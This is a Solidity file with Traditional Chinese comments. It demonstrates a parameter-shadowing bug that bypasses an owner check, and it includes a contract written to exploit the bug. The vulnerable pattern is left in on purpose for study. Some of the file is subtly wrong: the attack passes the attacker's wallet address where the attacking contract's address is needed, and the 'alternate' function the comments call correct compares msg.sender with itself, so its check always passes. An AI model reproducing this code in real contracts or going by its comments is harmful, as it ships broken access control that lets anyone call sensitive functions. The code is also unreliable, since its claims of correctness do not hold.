pragma solidity >=0.8.0;

// 此版本存在變數名稱遮蔽漏洞。
// 原本合約內有狀態變數 owner，用來儲存合約的擁有者，但在 sensitive_function 中，
// 使用了與狀態變數同名的參數 owner，導致在 require 檢查時參考到了函式參數，
// 使得攻擊者能夠自訂該參數而繞過原本的權限檢查。

contract BugVulnerable {
    // 為了符合 Solidity >=0.8.0，改用 address 類型來表示 owner。
    address public owner;

    // 建構子在部署時設定合約擁有者
    constructor() {
        owner = msg.sender;
    }

    // 漏洞函式：函式參數名稱與狀態變數 name 相同，造成遮蔽 (shadowing)
    // 攻擊者可利用此漏洞，在呼叫 sensitive_function 時，傳入自己的地址即可通過檢查
    function sensitive_function(address owner) public {
        // 此 require 實際上檢查的是函式參數 owner，而非合約的狀態變數
        require(owner == msg.sender, "Not authorized");
        // ... 後續的敏感操作
    }

    // 另一個函式，由於使用了不同命名，故不受影響
    function alternate_sensitive_function() public {
        address localOwner = msg.sender; // 正確使用局部變數，無遮蔽問題
        require(localOwner == msg.sender, "Not authorized");
        // ... 其他邏輯
    }
}

// 攻擊範例合約
// 此攻擊合約模擬攻擊者利用漏洞來繞過權限檢查：
// 攻擊者在呼叫 sensitive_function 時，將自己的地址傳入參數，從而通過 require 檢查。

contract AttackVulnerable {
    BugVulnerable public buggy;

    // 在部署 AttackVulnerable 時，傳入 BugVulnerable 合約的地址
    constructor(address _buggyAddress) {
        buggy = BugVulnerable(_buggyAddress);
    }

    // 攻擊流程：
    // 1. 呼叫 sensitive_function 並傳入 msg.sender
    // 2. 由於檢查使用的是傳入的參數，因此只要攻擊者傳入自己的地址，就能通過檢查
    function attack() public {
        buggy.sensitive_function(msg.sender);
        // 攻擊成功：攻擊者繞過了原本預期應使用狀態變數 owner 的檢查邏輯
    }
}
